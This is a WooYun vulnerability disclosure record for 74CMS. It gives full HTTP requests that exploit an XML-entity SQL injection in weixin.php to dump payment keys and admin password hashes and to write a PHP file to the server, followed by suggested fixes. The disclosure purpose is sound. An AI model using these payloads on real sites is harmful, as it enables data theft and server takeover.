{"id": 47329, "wybug_id": "wooyun-2014-081223", "wybug_title": "骑士CMS(20141027)多个漏洞组合可致所有数据泄露+getshell", "wybug_corp": "74c,s.com", "wybug_author": "龟兔赛跑", "wybug_date": "2014-10-30 18:47", "wybug_open_date": "2015-01-28 18:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "逻辑错误", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-28：\t细节向公众公开  简要描述： 专注挖魂。。。74cms_v3.5.1_20141027.zip 无限制SQL注入 详细说明：  刚下了个74cms_v3.5.1_20141027.zip，diff了一下发现了下面的改动：\ndiff -Nurp upload.1020/plus/weixin.php upload.1027/plus/weixin.php--- upload.1020/plus/weixin.php\t2014-10-18 12:14:22.000000000 +0800+++ upload.1027/plus/weixin.php\t2014-10-25 14:45:22.000000000 +0800@@ -21,10 +21,10 @@ class wechatCallbackapiTest extends mysq     }     public function responseMsg()     {-\t\tif(!$this->checkSignature())-\t\t{-        \texit();-        }+\t\t// if(!$this->checkSignature())+\t\t// {+  //       \texit();+  //       } \t\t$postStr = addslashes($GLOBALS[\"HTTP_RAW_POST_DATA\"]); \t\tif (!empty($postStr)) \t\t{\n注释调了checkSignature()，是为了啥？？？？？ WooYun: 74CMS最新版绕过继续任意文件读取(通用性分析)到任意文件删除 曾经分析过这里的XXE漏洞以及SQLI，不过，被次利用的是另外两个BUG。先看code.\nclass wechatCallbackapiTest extends mysql{\tpublic function valid()    {        $echoStr = $_GET[\"echostr\"];        if($this->checkSignature())\t\t{        \texit($echoStr);        }    }    public function responseMsg()    {\t\t// if(!$this->checkSignature())\t\t// {  //       \texit();  //       }\t\t$postStr = addslashes($GLOBALS[\"HTTP_RAW_POST_DATA\"]);\t\tif (!empty($postStr))\t\t{\t\t\t// libxml_disable_entity_loader(true);            $postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);            $fromUsername = $postObj->FromUserName;            $toUsername = $postObj->ToUserName;            $keyword = trim($postObj->Content);\t\t\t$keyword = utf8_to_gbk($keyword);\t\t\t$keyword = addslashes($keyword);            $time = time();\t\t\t$event = trim($postObj->Event);\t\t\t\t\t\tif ($event === \"subscribe\")\t\t\t{\t\t\t\t$word= \"»ØžŽj·µ»ØœôŒ±ÕÐÆž£¬»ØžŽn·µ»Ø×îÐÂÕÐÆž£¡Äú¿ÉÒÔ³¢ÊÔÊäÈëÖ°Î»Ãû³ÆÈç¡°»áŒÆ¡±£¬ÏµÍ³œ«»á·µ»ØÄúÒªÕÒµÄÐÅÏ¢£¬ÎÒÃÇÅ¬ÁŠŽòÔì×îÈËÐÔ»¯µÄ·þÎñÆœÌš£¬Ð»Ð»¹Ø×¢¡£\";\t\t\t\t$this->exit_word_message($word,$fromUsername,$toUsername,$time);\t\t\t\t\t\t}\t\t\t\t$default_pic=ROOT.\"/data/images/\".DEFAULT_PIC;\t\t\t$first_pic=ROOT.\"/data/images/\".FIRST_PIC;\t\t\tif($event === \"CLICK\"){\t\t\t\tif($_CFG['weixin_apiopen']=='0')\t\t\t\t{\t\t\t\t\t$word=\"ÍøÕŸÎ¢ÐÅœÓ¿ÚÒÑŸ­¹Ø±Õ\";\t\t\t\t\t$this->exit_word_message($word,$fromUsername,$toUsername,$time);\t\t\t\t}\t\t\t\tif($postObj->EventKey==\"binding\"){\t\t\t\t\t$usinfo = $this->get_user_info($fromUsername);\t\t\t\t\tif(!empty($usinfo)){\t\t\t\t\t\t$word=\"ÄúÒÑŸ­°ó¶š¹ýÁË!\";\t\t\t\t\t}else{\t\t\t\t\t\t$word=\"ÇëÊäÈëÄúµÄÕËºÅÃÜÂë.ÀýÈç:ÕÅÈý/123456\";\t\t\t\t\t}\t\t\t\t\t$this->exit_word_message($word,$fromUsername,$toUsername,$time);\t\t\t\t}...\tprivate function get_user_info($fromUsername){\t\t$usinfo = array();\t\t$usinfo_obj = $this->query(\"select * from \".table('members').\" where weixin_openid='\".$fromUsername.\"' limit 1\");\t\twhile($row = $this->fetch_array($usinfo_obj)){\t\t\t$usinfo = $row;\t\t}\t\treturn $usinfo;\t}\n\n$postStr = addslashes($GLOBALS[\"HTTP_RAW_POST_DATA\"]);\n对整个POST_DATA做了addslashes。\n$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);            $fromUsername = $postObj->FromUserName;\n然后：\n$usinfo = $this->get_user_info($fromUsername);===>$this->query(\"select * from \".table('members').\" where weixin_openid='\".$fromUsername.\"' limit 1\");\n$fromUsername从simplexml_load_string()后就直接进入了SQL中，addslashes($GLOBALS[\"HTTP_RAW_POST_DATA\"])就解决了所有问题么？答案是否定的。因为XML中特殊字符也可以编码：\n特殊字符 特殊含义 实体编码> 开始标记 &gt;< 结束标记 &lt;\" 引号 &quot;' 撇号 &apos;& 和号 &amp;\n也就是说在XML中使用&apos就把'号注入进去了，并且这里post data没有任何过滤，可以注入任何SQL语句，所以我们可以导出整个数据库，甚至getshell.看到下面的代码，也许有人会说，这里是有条件的，因为这里判断了$_CFG['weixin_apiopen']=='0')。\nif($event === \"CLICK\"){\t\t\t\tif($_CFG['weixin_apiopen']=='0')\t\t\t\t{\t\t\t\t\t$word=\"ÍøÕŸÎ¢ÐÅœÓ¿ÚÒÑŸ­¹Ø±Õ\";\t\t\t\t\t$this->exit_word_message($word,$fromUsername,$toUsername,$time);\t\t\t\t}\n不过，这里的$_CFG['weixin_apiopen']真的有效么？下面的代码可以告诉我们：\n<?php$_CFG = 0;class Test {    function myprint() {        echo \"$_CFG in class=\" . $_CFG;    }}echo \"in file =\" . $_CFG;$tt = new Test();$tt->myprint();?>\n在浏览器访问一下http://127.0.0.1:8081/74cms/test.php，结果为：\nin file =0Notice: Undefined variable: _CFG in /var/www/html/74cms/test.php on line 7Notice: Undefined variable: _CFG in /var/www/html/74cms/test.php on line 7in class=\n也就是在class object里面访问$_CFG是无效的。那么，那么，\n$_CFG['weixin_apiopen']=='0'\n这个条件就是永远都不会成立的，不管你后台开不开weixin_api。好了，所有条件限制都排除了，可以直接注入了。一下为74cms_v3.5.1_20141027默认安装测试：\nPOST /74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Content-Type: application/xml User-Agent: http4e/5.0.12Host: 127.0.0.1:8081Content-Length: 155<xml><ToUserName>111</ToUserName><FromUserName>1111&apos;</FromUserName><Content>2222</Content><Event>CLICK</Event><EventKey>binding</EventKey></xml>\n\nHTTP/1.1 200 OKDate: Wed, 29 Oct 2014 07:33:13 GMTServer: Apache/2.4.10 (Fedora) PHP/5.5.18 mod_wsgi/3.5 Python/2.7.5 mod_perl/2.0.9-dev Perl/v5.18.4X-Powered-By: PHP/5.5.18Set-Cookie: PHPSESSID=2ctd2pnvhip2mpvbs57rlvmq91; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 79Content-Type: text/html;charset=gb2312Error��Query error:select * from qs_members where weixin_openid='1111'' limit 1\nUNION SELECT:\nPOST /74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Content-Type: application/xml User-Agent: http4e/5.0.12Host: 127.0.0.1:8081Content-Length: 226<xml><ToUserName>111</ToUserName><FromUserName>1111&apos; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</FromUserName><Content>2222</Content><Event>CLICK</Event><EventKey>binding</EventKey></xml>\n\nHTTP/1.1 200 OKDate: Wed, 29 Oct 2014 07:36:59 GMTServer: Apache/2.4.10 (Fedora) PHP/5.5.18 mod_wsgi/3.5 Python/2.7.5 mod_perl/2.0.9-dev Perl/v5.18.4X-Powered-By: PHP/5.5.18Set-Cookie: PHPSESSID=3nh4puf9it16ea6omld6h26412; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 316Content-Type: text/html;charset=gb2312<xml>\t\t<ToUserName><![CDATA[1111' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#]]></ToUserName>\t\t<FromUserName><![CDATA[111]]></FromUserName>\t\t<CreateTime>1414568219</CreateTime>\t\t<MsgType><![CDATA[text]]></MsgType>\t\t<Content><![CDATA[您已经绑定过了!]]></Content>\t\t</xml>\n获取支付相关的key：\nPOST /74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Content-Type: application/xml User-Agent: http4e/5.0.12Host: 127.0.0.1:8081Content-Length: 303<xml><ToUserName>111</ToUserName><FromUserName>1111&apos; union select (select group_concat(id,0x7c,typename,0x7c,ytauthkey,0x5d) from qs_payment),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</FromUserName><Content>2222</Content><Event>CLICK</Event><EventKey>apply_jobs</EventKey></xml>\n\nHTTP/1.1 200 OKDate: Wed, 29 Oct 2014 07:49:52 GMTServer: Apache/2.4.10 (Fedora) PHP/5.5.18 mod_wsgi/3.5 Python/2.7.5 mod_perl/2.0.9-dev Perl/v5.18.4X-Powered-By: PHP/5.5.18Set-Cookie: PHPSESSID=u4o47rf3pk29shkk433cfompj0; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 137Content-Type: text/html;charset=gb2312Error��Query error:select * from qs_personal_jobs_apply where personal_uid=1|remittance|],2|chinabank|],3|tenpay|xndcgc],4|alipay|kiohad]\n错误信息里面的\n1|remittance|],2|chinabank|],3|tenpay|xndcgc],4|alipay|kiohad]\n就是表里面的数据。管理员表：\nPOST /74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Content-Type: application/xml User-Agent: http4e/5.0.12Host: 127.0.0.1:8081Content-Length: 303<xml><ToUserName>111</ToUserName><FromUserName>1111&apos; union select (select group_concat(admin_name,0x7c,pwd,0x7c,pwd_hash,0x5d) from qs_admin),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</FromUserName><Content>2222</Content><Event>CLICK</Event><EventKey>apply_jobs</EventKey></xml>\n\nHTTP/1.1 200 OKDate: Wed, 29 Oct 2014 08:09:07 GMTServer: Apache/2.4.10 (Fedora) PHP/5.5.18 mod_wsgi/3.5 Python/2.7.5 mod_perl/2.0.9-dev Perl/v5.18.4X-Powered-By: PHP/5.5.18Set-Cookie: PHPSESSID=dgh5nio4aflji6ppjatq9iee14; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 121Content-Type: text/html;charset=gb2312Error��Query error:select * from qs_personal_jobs_apply where personal_uid=admin|81cdc144e960168e163223605e5daeba|taZeD1]\ngetshell:\nPOST /74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Content-Type: application/xml User-Agent: http4e/5.0.12Host: 127.0.0.1:8081Content-Length: 324<xml><ToUserName>111</ToUserName><FromUserName>1111&apos; union select 0x3C3F70687020706870696E666F28293B3F3E,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 INTO OUTFILE &apos;/var/www/html/74cms/data/shell.php&apos; #</FromUserName><Content>2222</Content><Event>CLICK</Event><EventKey>binding</EventKey></xml>\n返回错误：\nHTTP/1.1 200 OKDate: Wed, 29 Oct 2014 08:29:11 GMTServer: Apache/2.4.10 (Fedora) PHP/5.5.18 mod_wsgi/3.5 Python/2.7.5 mod_perl/2.0.9-dev Perl/v5.18.4X-Powered-By: PHP/5.5.18Set-Cookie: PHPSESSID=tkimiq88f2v707inhs5avrvbd5; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 238Content-Type: text/html;charset=gb2312Error��Query error:select * from qs_members where weixin_openid='1111' union select 0x3C3F70687020706870696E666F28293B3F3E,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 INTO OUTFILE '/var/www/html/74cms/data/shell.php' #' limit 1\n这是因为写shell.php需要有写权限，data目录不行。但是，但是，我们也可以找一个肯定有写权限的目录：注册一个普通用户，长传一个头像，这是会建立0777权限的目录：'data/avatar/100/2014',shell就传到这个目录吧。\nPOST /74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Content-Type: application/xml User-Agent: http4e/5.0.12Host: 127.0.0.1:8081Content-Length: 340<xml><ToUserName>111</ToUserName><FromUserName>1111&apos; union select 0x3C3F70687020706870696E666F28293B3F3E,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 INTO OUTFILE &apos;/var/www/html/74cms/data/avatar/100/2014/shell.php&apos; #</FromUserName><Content>2222</Content><Event>CLICK</Event><EventKey>binding</EventKey></xml>\n\nHTTP/1.1 200 OKDate: Wed, 29 Oct 2014 08:25:09 GMTServer: Apache/2.4.10 (Fedora) PHP/5.5.18 mod_wsgi/3.5 Python/2.7.5 mod_perl/2.0.9-dev Perl/v5.18.4X-Powered-By: PHP/5.5.18Set-Cookie: PHPSESSID=8m121t281t85udkja8rt8ub147; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 448Content-Type: text/html;charset=gb2312<xml>\t\t<ToUserName><![CDATA[1111' union select 0x3C3F70687020706870696E666F28293B3F3E,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 INTO OUTFILE '/var/www/html/74cms/data/avatar/100/2014/shell.php' #]]></ToUserName>\t\t<FromUserName><![CDATA[111]]></FromUserName>\t\t<CreateTime>1414571109</CreateTime>\t\t<MsgType><![CDATA[text]]></MsgType>\t\t<Content><![CDATA[请输入您的账号密码.例如:张三/123456]]></Content>\t\t</xml>\n浏览器访问：http://127.0.0.1:8081/74cms/data/avatar/100/2014/shell.php\n\n   漏洞证明：  获取支付相关的key：\nPOST /74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Content-Type: application/xml User-Agent: http4e/5.0.12Host: 127.0.0.1:8081Content-Length: 303<xml><ToUserName>111</ToUserName><FromUserName>1111&apos; union select (select group_concat(id,0x7c,typename,0x7c,ytauthkey,0x5d) from qs_payment),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</FromUserName><Content>2222</Content><Event>CLICK</Event><EventKey>apply_jobs</EventKey></xml>\n\nHTTP/1.1 200 OKDate: Wed, 29 Oct 2014 07:49:52 GMTServer: Apache/2.4.10 (Fedora) PHP/5.5.18 mod_wsgi/3.5 Python/2.7.5 mod_perl/2.0.9-dev Perl/v5.18.4X-Powered-By: PHP/5.5.18Set-Cookie: PHPSESSID=u4o47rf3pk29shkk433cfompj0; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 137Content-Type: text/html;charset=gb2312Error��Query error:select * from qs_personal_jobs_apply where personal_uid=1|remittance|],2|chinabank|],3|tenpay|xndcgc],4|alipay|kiohad]\n管理员表：\nPOST /74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Content-Type: application/xml User-Agent: http4e/5.0.12Host: 127.0.0.1:8081Content-Length: 303<xml><ToUserName>111</ToUserName><FromUserName>1111&apos; union select (select group_concat(admin_name,0x7c,pwd,0x7c,pwd_hash,0x5d) from qs_admin),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</FromUserName><Content>2222</Content><Event>CLICK</Event><EventKey>apply_jobs</EventKey></xml>\n\nHTTP/1.1 200 OKDate: Wed, 29 Oct 2014 08:09:07 GMTServer: Apache/2.4.10 (Fedora) PHP/5.5.18 mod_wsgi/3.5 Python/2.7.5 mod_perl/2.0.9-dev Perl/v5.18.4X-Powered-By: PHP/5.5.18Set-Cookie: PHPSESSID=dgh5nio4aflji6ppjatq9iee14; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 121Content-Type: text/html;charset=gb2312Error��Query error:select * from qs_personal_jobs_apply where personal_uid=admin|81cdc144e960168e163223605e5daeba|taZeD1]\ngetshell:\n\n   修复方案：  1. checkSignature()不需要了？2. if($_CFG['weixin_apiopen']=='0') always不成立，文件最前面用：define(\"APIOPEN\", $_CFG['weixin_apiopen']);吧。3. $postObj的每个元素使用前先addslashes()4. 上传图片文件的目录不需要用0777的权限吧。   版权声明：转载请注明来源 龟兔赛跑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-11-03 15:25 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-30 19:19 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  shell 终于来了    \n     2014-11-01 04:16 |    \t\th4ckhell00 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 最温暖的两个字是什么？1、我在。2、别怕。...)\t\t \n  shell 终于来了    \n     2014-11-01 07:47 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  龟兔，你拿了多少钱啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}